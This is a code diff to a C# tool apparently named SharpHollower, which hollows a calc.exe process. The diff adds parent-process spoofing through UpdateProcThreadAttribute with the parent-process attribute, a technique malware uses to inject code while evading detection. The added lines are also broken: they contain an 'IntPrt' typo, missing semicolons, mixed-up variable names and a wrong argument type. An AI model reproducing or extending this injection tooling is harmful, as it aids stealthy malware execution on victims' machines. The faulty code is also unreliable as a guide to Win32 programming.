@@ -41,7 +41,16 @@ namespace SharpHollower
         static extern uint GetLastError();
         public static byte[] target_ = Encoding.ASCII.GetBytes("calc.exe");
         public static string HollowedProcess; 
-
+        [DllImport("kernel32.dll", SetLastError=true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool UpdateProcThreadAttribute(
+            IntPtr lpAttributeList,
+            uint dwFlags,
+            IntPtr Attribute,
+            IntPtr lpValue,
+            IntPtr cbSize,
+            IntPtr lpPreviousValue,
+            IntPtr lpReturnSize);
         
 
         [StructLayout(LayoutKind.Sequential)]
@@ -262,9 +271,9 @@ namespace SharpHollower
             IntPtr lpSize = IntPtr.Zero;
             InitializeProcThreadAttributeList(null, 1, 0, ref lpSize);
             si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeToAllocate);
-
-
-
+            InitializeProcThreadAttributeList(startInfo.lpAttributeList, 1, 0, ref lpSize);
+            UpdateProcThreadAttribute(si.lpAttributeList, 0, 0x00020000, (IntPrt)processhandle, IntPtr.Size, (IntPtr)0, (IntPtr)0) 
+            startInfo.cb = System.Runtime.InteropServices.Marshal.SizeOf(startInfo)
             if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, true, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                 throw new SystemException("[x] Failed to create process!");
 
